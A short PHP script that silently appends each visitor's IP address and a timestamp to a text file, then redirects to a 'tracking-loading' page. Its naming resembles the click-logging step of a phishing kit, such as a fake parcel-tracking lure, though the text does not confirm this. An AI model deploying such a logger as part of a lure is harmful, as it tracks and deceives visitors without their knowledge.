<?php

$file = fopen("click.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$adddate\r\n");
fputs ($file, "$ip\r\n");
fputs ($file, "-----------------------------------\r\n");
fclose ($file);

header("Location: tracking-loading.html?ssl=yes");
?>